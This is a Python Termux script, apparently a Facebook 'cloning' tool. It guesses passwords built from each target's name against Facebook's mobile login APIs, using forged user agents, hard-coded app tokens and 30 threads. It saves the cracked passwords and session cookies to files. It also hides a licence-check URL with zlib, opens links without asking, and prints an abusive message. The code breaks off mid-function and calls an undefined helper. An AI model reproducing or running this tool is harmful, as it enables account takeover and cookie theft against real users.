# TOOLS DEVLOPER : MAHADI HASAN RAKIB
# FACEBOOK : MAHDI HASAN RAKIB
# GITHUB : argrakib007
#──────────────{ IMPORT }──────────────#
import os,bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,requests,httpx,re
from bs4 import BeautifulSoup
from os import path
import os,base64,zlib,pip,urllib
import requests,bs4,mechanize,httpx
from os import system as clr
from bs4 import BeautifulSoup as sop
from pip._vendor import requests as requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#──────────────{ DATE }──────────────#
import time
from datetime import datetime
sasi = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
tete = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
now = datetime.now()
hari = now.day
blx = now.month
thn = now.year
try:
    if blx < 0 or blx > 12:exit()
    xx = blx - 1
except ValueError:exit()
bulan = sasi[xx]
tahun = now.year
today = '\x1b[38;5;46m'+str(hari)+'\033[1;97m-\x1b[38;5;46m'+str(bulan)+'\033[1;97m-\x1b[38;5;45m'+str(thn)+''
#──────────────{ SERVER CONNECT }──────────────#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;35m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';W = '\x1b[38;5;123m';P = '\x1b[38;5;122m';T = '\x1b[38;5;86m';U = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';G0 = '\x1b[38;5;46m'
yellow = '\x1b[38;5;208m'
black='\033[1;30m'
rad='\033[1;31m'
green='\33[38;5;46m'
yelloww='\033[1;33m'
R ='\033[1;34m'
purple='\033[1;35m'
cyan='\033[1;36m'
white='\033[1;37m'
faltu = '\033[1;41m'
pvt = '\033[1;0m'
G16 = '\x1b[1;92m\x1b[38;5;208m'# برتقالي فاتح
G17 = '\x1b[1;92m\x1b[38;5;209m'# برتقالي + وردي 35%
G18 = '\x1b[1;92m\x1b[38;5;210m'# برتقالي + وردي 66% 

#──────────────{ SIM NAME }──────────────#
sim = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').replace('\n','').replace(',',f'\x1b[38;5;205m ● \x1b[38;5;46m')
#──────────────{ LOOP }──────────────#
loop = 0;oks = [];cps = [];id = []
#__________________| COLOUR |__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;35m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';W = '\x1b[38;5;123m';P = '\x1b[38;5;122m';T = '\x1b[38;5;86m';U = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';G0 = '\x1b[38;5;46m'
yellow = '\x1b[38;5;208m'
black='\033[1;30m'
rad='\033[1;31m'
green='\33[38;5;46m'
yelloww='\033[1;33m'
R ='\033[1;34m'
purple='\033[1;35m'
FX = '\x1b[1;98m'
cyan='\033[1;36m'
white='\033[1;37m'
faltu = '\033[1;41m'
pvt = '\033[1;0m'
G16 = '\x1b[1;92m\x1b[38;5;208m'# برتقالي فاتح
G17 = '\x1b[1;92m\x1b[38;5;209m'# برتقالي + وردي 35%
G18 = '\x1b[1;92m\x1b[38;5;210m'# برتقالي + وردي 66%
VX = '\033[38;5;92m'
asu = random.choice([U,G,X,M,S])
my_color = [
 P, yellow, M, G16, B, U, white, green, cyan, A, Y, T, Y, W, X1]
warna = random.choice(my_color)
#-----c2----#
asu = random.choice([U,G,X,M,S])
my_color = [
 P, yellow, white, green, ]
xx = random.choice(my_color)
#----c3-----#
asu = random.choice([U,G,X,M,S])
my_color = [
 M, S, VX]
f = random.choice(my_color)
#──────────────{ LINEX }──────────────#
sys.stdout.write('\x1b]2; RAKIB-XD\x07')
def clear():os.system('clear');print(logo)
def linex():print(f"{warna}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#──────────────{ NORMAL-UA-FOR-M8 }──────────────#
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
for xd in range(5000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
#──────────────{ UA-FOR-RANDOM-M1 }──────────────#	
def f1():
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	fbrv = str(random.randint(000000000,999999999))
	density = random.choice(['2.0', '2.5', '3.0'])
	width = random.choice(["720", "1080", "1280"])
	height = random.choice(["720", "1080", "1280", "1440", "1920"])
	ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/MTN-CG;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_X01BDA;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]"
	return ua
#──────────────{ UA-FOR-FILE-M2 }──────────────#
def bro():
	kk = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
	azn = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+str(kk)+';FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
	return azn
#──────────────{ UA-FOR-FILE-M3 }──────────────#
def f3():
    ua = "[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ';[FBAN/Orca-Android;FBAV/98.0.0.32.13;FBBV/11557663;FBDM/{density=5.0,width=480,height=800};FBLC/en_GB;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-G357FZ;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
    return ua	
#──────────────{ UA-FOR-RANDOM-M1 }──────────────#
def r():
    ua = 'Dalvik/2.1.0 (Linux; U; Android 10.0.0; 10A Build/CX0VTI) [FBAN/FB4A;FBAV/488.0.0.26265;FBBV/654205655;[FBAN/FB4A;FBAV/488.0.0.26265;FBBV/654205655;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Fban;FBMF/Redmi;FBBD/Redmi;FBPN/com.facebook.orca;FBDV/10A;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]'
    return ua
#──────────────{ UA-FIR-RANDOM-M2 }──────────────#
def sava():
	fban = random.choice(["FB4A"])
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
	width = random.choice(["720", "1080", "1280"])
	height = random.choice(["720", "1080", "1280", "1440", "1920"])
	fbcr = random.choice(['Nepal_Telecom', 'Banglalink', 'Robi', 'Grameenphone', 'Airtel'])
	fblc = random.choice(["en_US", "en_GB"])
	fbbd = 'Xiaomi'
	fbpn = random.choice(["com.facebook.katana"])
	fbsv = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	fbmf = 'Xiaomi'
	build = random.choice(['SKQ1.210216.001','RKQ1.211103.002','SP1A.210812.016','TP1A.220905.001'])
	fbdv = random.choice(["Redmi Note 7", "Redmi Note 8", "Redmi Note 9", "Redmi Note 10", "Redmi 7", "Redmi 8", "Redmi 9", "Redmi 10", "Redmi 9A", "Redmi 9C", "Redmi K20", "Redmi K30", "Redmi K40", "Redmi 5A", "Redmi 6A", "Redmi 7A", "Redmi 8A", "Redmi 9T", "Redmi Note 7 Pro", "Redmi Note 8 Pro", "Redmi Note 4", "Redmi Note 5", "Redmi Note 6 Pro", "Redmi 4X", "Redmi Y2", "Redmi Note 8T"])
	END = f"[FBAN/{str(fban)};FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(fblc)};FBCR/{str(fbcr)};FBMF/{str(fbmf)};FBBD/{str(fbbd)};FBPN/{str(fbpn)};FBDV/{str(fbdv)};FBSV/{str(fbsv)};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	ua = f'Davik/2.1.0 (Linux; U; Android {str(fbsv)}; {str(fbdv)} Build/'+str(build)+') '+END
	ua =f'Mozilla/5.0 (Linux; Android {str(fbsv)}; {str(fbdv)} Build/'+str(build)+') '+END
	ua=f'Mozilla/3.0 (Linux; Android {str(fbsv)}; {str(fbdv)} Build/'+str(build)+') '+END
	return ua 
#──────────────{ LOGO }──────────────#
os.system(f'xdg-open https://www.facebook.com/groups/1452075611966803/?ref=share')
logo =( f"""
{green}██████ {rad} ██████ {M} ███    ██{S}  ██████{yellow} ███████ 
{green}██   ██ {rad}██   ██ {M}████   ██ {S}██   {yellow}   ██      
{green}██████{rad}  ██████ {M} ██ ██  ██{S} ██   {yellow}   █████   
{green}██      {rad}██   ██ {M}██  ██ ██{S} ██   {yellow}   ██      
{green}██      {rad}██   ██ {M}██   ████ {S} ██████{yellow} ███████   {black}0{rad}\{white}1                                                                         
{warna}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {G} DEVELOPER — Prínce Lücky
 {G} FACEBOOK  — Prínce Lücky
 {G} TOOLS     — File - Random
{warna}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#__________________| APV |__________________#
xny = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5OKK)\xcb1442\xd0O,\xd0\xcfM\xcc\xcc\xd3\xcfJ\x03\x001"\x13\xc6')
update = requests.get(xny).text
uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""
kex = bxd+id
myweb2 = requests.get("https://github.com/cpa406/Approve/blob/main/Approve.txt").text
def apv():
	try:
		clear()
		x = requests.get('https://github.com/cpa406/Approve/blob/main/Approve.txt').text
		if str("upppdate") in update:
			os.system('clear')
			exit('script is in update / maintanance be patient ')
		elif str("res-sseett") in update:
			os.system('')
			os.system('')
			os.system('')
			exit('Dont Try To Bypass')
		elif kex in myweb2:
			menu()
		else:	
			clear()
			os.system('xdg-open https://www.facebook.com/profile.php?id=61559577947792')
			print(f"\033[1;32m[✓] \033[0;37m YOUR KEY \033[1;32m:\033[0;37m {kex}");linex()
			print(f"\033[1;32m[✓] \033[0;37m TOOL    \033[1;32m:\033[0;37m FILE\033[1;32m - \033[0;37mRANDOM")
			print(f"\033[1;32m[✓] \033[0;37m EXPIRED \033[1;32m:\033[0;37m YOUR KEY NOT REGISTERED");linex()
			print(f"\033[1;32m[✓] \033[0;37m START FILE CLONE")
			print(f"\033[1;32m[✓] \033[0;37m START RANDOM CLONE")
			print(f"\033[1;32m[✓] \033[0;37m CONTACT OWNER  ")
			print(f"\033[1;32m[✓] \033[0;37m EXIT ")
			print(f"\033[1;32m[01] \033[0;37m UPGRADE TO PREMIUM")
			linex()
			input(f"\033[1;32m[✓] \033[0;37m CHOICE \033[1;32m: \033[1;32m")
			os.system(f"termux-open-url https://wa.me/+880177415523?text={kex}")  	
			apv()
	except requests.exceptions.ConnectionError:
		exit(' No internet connection ..')
      
def rrrr():
        if kex in myweb2:
                pass
        else:
                apv()
#──────────────{ BYPASS }──────────────#
wak='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(wak+'sessions.py','r').read():
    pass
else:
    exit('\x1b[38;5;46mBēśyāra chēlē mēthaḍa kyāpacāra karabā tumi tōmāra mārē kuttā diẏē cōdai')
fu='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(fu+'models.py','r').read():
    pass
else:
    exit('\x1b[38;5;46mBēśyāra chēlē mēthaḍa kyāpacāra karabā tumi tōmāra mārē kuttā diẏē cōdai')
su='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(su+'utils.py','r').read():
    pass
else:
    exit('\x1b[38;5;46mBēśyāra chēlē mēthaḍa kyāpacāra karabā tumi tōmāra mārē kuttā diẏē cōdai')
hu='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(hu+'api.py','r').read():
    pass
else:
    exit('\x1b[38;5;46mBēśyāra chēlē mēthaḍa kyāpacāra karabā tumi tōmāra mārē kuttā diẏē cōdai')
nu='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(nu+'auth.py','r').read():
    pass
else:
    exit('\x1b[38;5;46mBēśyāra chēlē mēthaḍa kyāpacāra karabā tumi tōmāra mārē kuttā diẏē cōdai')
dhon='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(dhon+'packages.py','r').read():
    pass
else:
    exit('\033[1;32mBēśyāra chēlē mēthaḍa kyāpacāra karabā tumi tōmāra mārē kuttā diẏē cōdai')
#──────────────{ MENU }──────────────#
def menu():
    clear()
    linex()
    print(f"{G1}[A] FILE CLONE ");print(f"{G2}[B] RANDOM CLONING");print(f"{green}[0]{rad} EXIT CLONING");linex();option = input(f'{P}(?) CHOICE {white}▶ {U} ')
    if option in ['A','1']:__Filex__()
    elif option in ['B','2']:__Randmx__()
    #elif option in ['C','3']:ENCODE()
    elif option in ['D','4']:rakib()
    elif option in ['E','5']:file()
    #elif option in ['F','6']:ipMain()
    elif option in ['X','0']:exit()
    else:
        print(f'\n{A}|=| OPTION FOUND');menu()
#──────────────{ FILE }──────────────#
def __Filex__():
    clear()
    print(f"{G}[=] EXAMPLE : /sdcard/RAKIB-XD.txt ");linex();dfile = input(f'{G1}[{rad}?{G1}] CHOICE  : ')
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{A}|=| FILE NOT FOUND...');time.sleep(1);__Filex__()
    clear()
    print(f"{G}(1) METHOD M1 [B-GRAPH] ");print(f"{G2}(2) METHOD M2 [API]  ");print(f"{W}(3) METHOD M3 {G}[B-API] ");linex();methodx = input(f'{G}(?) CHOICE : ')
    dplist = []
    try:
        clear()
        pass_lmit = int(input(f'{G}(?) PASSWORD LIMIT : '))
    except:
        pass_lmit =1
    clear()
    print(f"{U}[=]EXAMPLE : firstlast | first123 |ETC| ");linex()
    for i in range(pass_lmit):
        dplist.append(input(f'{G4}[=]PASSWORD NO.{i+1} :{G} '))
    with ThreadPool(max_workers=30) as RAKIBx:
        clear();total_ids = str(len(dx))
        print(f"{G1}[{rad}∞{G1}] FILE UID : {total_ids} • {G2} PASSWORD : {pass_lmit} ");print(f"{G3}[{rad}∞{G3}] YOUR METHOD : {G4}{methodx} ");print(f"{G4}[{rad}∞{G4}] YOUR SIM : {U}{sim} ");print(f"{G5}[{rad}∞{G5}] USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for user in dx:
            ids,names = user.split('|')
            passlist = dplist
            if methodx in ['1']:RAKIBx.submit(__file_M1__,ids,names,passlist)
            if methodx in ['2']:RAKIBx.submit(__file_M2__,ids,names,passlist)
            if methodx in ['3']:RAKIBx.submit(__file_M3__,ids,names,passlist)
            if methodx in ['4']:RAKIBx.submit(__file_M4__,ids,names,passlist)
            if methodx in ['5']:RAKIBx.submit(__file_M5__,ids,names,passlist)
    print('');linex();print(f"{A}[=] CLONING COMPLETE ");print(f"{A}[=] {M}TOTAL OK ID :{G} {len(oks)}");print(f"{A}[=] {green}TOTAL CP ID :{R}{len(cps)}");linex;exit()
#──────────────{ FILE-METHOD-M1 }──────────────#
def __file_M1__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{white}[{U}Prínce~{yellow}F1{white}]{white}[{M}%s{white}]{black}/{white}[{green}OK-%s{white}]{black}/{rad}[CP-%s]{green} '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {"User-Agent": f1(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r{white}[{green}Prínce-Lücky~OK{white}] '+ids+' | '+pas)
                linex()
                print(f'\r\r{B}[{white}COOKIES{B}]{cookie}\n')
                open('/sdcard/Prínce-Lücky-F1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{B}[{R}Prínce-Lücky-CP{B}] '+ids+f' | '+pas)
                open('/sdcard/Prínce Lücky-F1-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#──────────────{ FILE-METHOD-M2 }──────────────#
def __file_M2__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{white}[{U}RxA~{yellow}F2{white}]{white}[{M}%s{white}]{black}/{white}[{green}OK-%s{white}]{black}/{rad}[CP-%s]{green} '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {'User-Agent': f2(),'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://api.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r{white}[{green}RxA~OK{white}] '+ids+' | '+pas)
                linex()
                print(f'\r\r{B}[{white}COOKIES{B}]{cookie}\n')
                open('/sdcard/Prínce Lücky-F2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{B}[{R}Prínce Lücky-CP{B}] '+ids+f' | '+pas)
                open('/sdcard/Prínce Lücky-F2-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#──────────────{ FILE-METHOD-M3 }──────────────#
def __file_M3__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{white}[{U}RxA~{yellow}F3{white}]{white}[{M}%s{white}]{black}/{white}[{green}OK-%s{white}]{black}/{rad}[CP-%s]{green} '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
